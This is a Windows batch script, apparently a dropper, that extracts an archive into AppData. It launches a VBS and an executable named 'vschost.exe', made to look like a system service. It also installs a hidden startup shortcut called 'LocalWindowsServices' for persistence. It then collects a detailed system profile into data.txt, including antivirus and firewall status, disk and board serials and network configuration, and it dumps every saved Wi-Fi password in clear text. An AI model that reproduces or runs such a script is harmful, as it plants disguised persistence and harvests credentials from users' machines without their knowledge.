@echo off
chcp 65001 >nul
echo.
echo                                     ..........                                                                                                    
echo                                         ...,,;;;;;;;,'..                                           
echo                                    .':clodddxxxxxxxxxxddol:,.                                      
echo                                .,coddxxxkkkkOkkkOOOOOOkkkxxxdoc,.                                  
echo                              ,codxkkkkkOOOO00000000000000OOOkkxdoc,                                
echo                            'codxkkkOOOOOOO000000KKXKXKKKKKK00OOOkxdl;                              
echo                           ;lodxkkkOOOOOO000000KKXXXNNXXXXXXKKK00OOkxdc.                            
echo                         .:clodxkkkkkOOO00KKKKKKXNNNNNNNNNNXXXKKK00Okxdo'                           
echo                         ;cclodxxkkkOOOO00KKXXXXXNNNNNNNWNNNNNNXXKK0Okkxd.                          
echo                        .;ccloddxkkkOOO0KXXXXXXXXNNNWNNWWWWWNNNXXXK0OOOkxl                          
echo                        ';:cloodxkkO00KKXXXXXXNNNNNNNWWWWWWWNNNXXXK0OOOkxo.                         
echo                        ,;:cllodxkkO0KKKXKXXXNNWWNNNNNNNWWWWWNNNXXK00Okkxo'                         
echo                        ,;:cclodxxkO0KKKKKXNNWWWNXXXXXNNNWWWWWNNXXK0OOkkxd,                         
echo                       .,;::clodxxkxddxOKXNWWWWWNXXXKKXXNNNXKKKXXXK0OOkkxd:                         
echo                       .;:::cclol;.     .,oOXWNNNNNNK0kxl;.    ..cO0OOkkxxl                         
echo                       ;cllc:,..           .oXXXXNNWWX:.....       'lxkOOkd'                        
echo                      ;loddood;.       .,cd0XXXNNNWWWWWKdc,...     .cO000Oxo.                       
echo                     ,codolllcodxc.....x00KKKKKKXNNNNNWWWWWOllc:c0K0kxkOKK0ko.                      
echo                    .;cl;;::;;:oxl.....l000KKKKXXNNNNNWWWNXollc;lKkoolc:cO0Okl                      
echo                    .,;'.,,;;:lxdl.....;O00K00KXXXNNNNNNWNKollccokokkdlc:;xOko                      
echo                     ....',,;;:llo'....,k00K0KKKKKXNNNNNNN0lllccddcddolc:;:xd,                      
echo                      .....'',,;ox,.....x00KKKKKXXNNNNNNWWkll:::x0:,:::;;,;oc                       
echo                       ......':dxxc....'xkxdddddxkkkOOO0KNOlccclKXKo;,,'';l,                        
echo                        ....,ox;...    .'...............';:... .'';dKOl:cl.                         
echo                         ....ok'                                   .Okolc.                          
echo                          ...,ko.                 .....           .:kllc.                           
echo                           ...;ko.                               .:kocc.                            
echo                            ...:Oo.                             .lkocc.                             
echo                             ...,xk;                .         .:xkolc.                              
echo                              ....cxx:.                    .'cxOxolc.                               
echo                               ....':oddl;..           .,cdkOOkdol:                                 
echo                                 ....',;:cllllcccccllodOOkkxxdolc,                                  
echo                                  .......'..'''''''''',:ddoolcc,                                    
echo                                     ..................:cc:;,.                                      
echo                                        ...           .....                                         

setlocal EnableExtensions

:: === Variables ===
set "ZIPFILE=LocalSettings.zip"
set "DEST=%AppData%"
set "VBS=%DEST%\LocalSettings\LocalWindowsServices.vbs"
set "EXE=%DEST%\LocalSettings\vschost.exe"
set "STARTUP=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
set "SHORTCUT=%STARTUP%\LocalWindowsServices.lnk"
set "SEVENZIP=%~dp0\7-Zip\App\7-Zip\7z.exe"

:: =====================================================
:: Step 0: STOP PROCESSES (ORDER MATTERS)
:: 1) wscript.exe + cscript.exe
:: 2) vschost.exe
:: =====================================================
tasklist | find /I "schost.exe" >nul && taskkill /F /IM schost.exe >nul 2>&1
:: --- Stop ALL wscript & cscript ---
powershell -NoProfile -Command ^
  "Get-Process wscript,cscript -ErrorAction SilentlyContinue | Stop-Process -Force"

:: --- Stop vschost.exe ---
powershell -NoProfile -Command ^
  "Get-Process vschost -ErrorAction SilentlyContinue | Stop-Process -Force"

:: Small delay to ensure release
timeout /t 2 /nobreak >nul

:: =====================================================
:: Step 1: Extract LocalSettings.zip to %AppData%
:: =====================================================
if not exist "%SEVENZIP%" (
    echo ERROR: 7z.exe not found!
    pause
    exit /b 1
)

"%SEVENZIP%" x "%~dp0%ZIPFILE%" -o"%DEST%" -y >nul

:: =====================================================
:: Step 2: Ensure Startup folder exists
:: =====================================================
if not exist "%STARTUP%" mkdir "%STARTUP%"

:: =====================================================
:: Step 3: Remove ANY startup shortcut launching wscript
:: =====================================================
powershell -NoProfile -Command ^
  "$ws = New-Object -ComObject WScript.Shell; " ^
  "Get-ChildItem '%STARTUP%' -Filter *.lnk | ForEach-Object { " ^
  "  $sc = $ws.CreateShortcut($_.FullName); " ^
  "  if ($sc.TargetPath -match 'wscript.exe') { Remove-Item $_.FullName -Force } " ^
  "}"

:: =====================================================
:: Step 4: Create new startup shortcut
:: =====================================================
powershell -NoProfile -Command ^
  "$ws = New-Object -ComObject WScript.Shell; " ^
  "$s = $ws.CreateShortcut('%SHORTCUT%'); " ^
  "$s.TargetPath = 'wscript.exe'; " ^
  "$s.Arguments = '\"%VBS%\"'; " ^
  "$s.WindowStyle = 0; " ^
  "$s.WorkingDirectory = '%DEST%\LocalSettings'; " ^
  "$s.IconLocation = 'wscript.exe,0'; " ^
  "$s.Save()"

:: =====================================================
:: Step 5: Relaunch VBS
:: =====================================================
start "" wscript.exe "%VBS%"


setlocal enabledelayedexpansion

set "FILE=data.txt"
echo Collecting system information...
echo ----------------------------------------- > "%FILE%"
echo SYSTEM INFORMATION REPORT >> "%FILE%"
echo Generated on: %DATE% %TIME% >> "%FILE%"
echo ----------------------------------------- >> "%FILE%"
echo. >> "%FILE%"

:: ===== OS Info =====
echo [Operating System] >> "%FILE%"
systeminfo | findstr /C:"OS Name" /C:"OS Version" /C:"System Type" >> "%FILE%"
echo. >> "%FILE%"

:: ===== Hardware UUID =====
echo [Hardware UUID] >> "%FILE%"
powershell -command "(Get-CimInstance Win32_ComputerSystemProduct).UUID" >> "%FILE%"
echo. >> "%FILE%"

:: ===== CPU Info =====
echo [CPU] >> "%FILE%"
powershell -command "Get-CimInstance Win32_Processor | Select-Object Name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed" >> "%FILE%"
echo. >> "%FILE%"

:: ===== RAM Info =====
echo [Memory] >> "%FILE%"
powershell -command "Get-CimInstance Win32_PhysicalMemory | Select-Object Manufacturer,PartNumber,Speed,Capacity" >> "%FILE%"
echo Total_RAM_GB: >> "%FILE%"
powershell -command "(Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB" >> "%FILE%"
echo. >> "%FILE%"

:: ===== GPU Info =====
echo [GPU] >> "%FILE%"
powershell -command "Get-CimInstance Win32_VideoController | Select-Object Name,AdapterRAM,DriverVersion" >> "%FILE%"
echo. >> "%FILE%"

:: ===== Battery Info =====
echo [Battery] >> "%FILE%"
powershell -command "Get-CimInstance Win32_Battery | Select-Object EstimatedChargeRemaining,BatteryStatus,DesignCapacity,FullChargeCapacity" >> "%FILE%"
echo. >> "%FILE%"

:: ===== Motherboard Info =====
echo [Motherboard] >> "%FILE%"
powershell -command "Get-CimInstance Win32_BaseBoard | Select-Object Product,Manufacturer,SerialNumber,Version" >> "%FILE%"
echo. >> "%FILE%"

:: ===== BIOS Info =====
echo [BIOS] >> "%FILE%"
powershell -command "Get-CimInstance Win32_BIOS | Select-Object Manufacturer,SMBIOSBIOSVersion,ReleaseDate" >> "%FILE%"
echo. >> "%FILE%"

:: ===== Disk Info =====
echo [Disks] >> "%FILE%"
powershell -command "Get-CimInstance Win32_DiskDrive | Select-Object Model,SerialNumber,InterfaceType,Size" >> "%FILE%"
echo. >> "%FILE%"

:: ===== Network Info =====
echo [Network Adapters] >> "%FILE%"
echo. >> "%FILE%"

:: ===== IP Info =====
echo [IP Configuration] >> "%FILE%"
ipconfig /all >> "%FILE%"
echo. >> "%FILE%"

:: ===== Antivirus Status =====
echo [Antivirus Status] >> "%FILE%"
powershell -command "Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AMServiceEnabled" >> "%FILE%"
echo. >> "%FILE%"

:: ===== Firewall Status =====
echo [Firewall Status] >> "%FILE%"
netsh advfirewall show allprofiles >> "%FILE%"
echo. >> "%FILE%"

:: ===== Installed Applications =====
echo [Installed Applications] >> "%FILE%"
echo. >> "%FILE%"

:: ===== Wi-Fi Saved Networks + Passwords =====
setlocal enabledelayedexpansion
echo [Saved Wi-Fi Networks and Passwords] >> "%FILE%"
for /f "tokens=2 delims=:" %%A in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
    set "ssid=%%A"
    REM Trim leading space
    for /f "tokens=* delims= " %%B in ("!ssid!") do set "ssid=%%B"
    echo SSID: !ssid! >> "%FILE%"
    netsh wlan show profile name="!ssid!" key=clear >> "%FILE%" 2>nul
    echo. >> "%FILE%"
)
echo. >> "%FILE%"

:: ===== Running Processes =====
echo [Running Processes] >> "%FILE%"
tasklist >> "%FILE%"
echo. >> "%FILE%"

echo DONE. System info saved to %FILE%.
:: Finished
exit /b
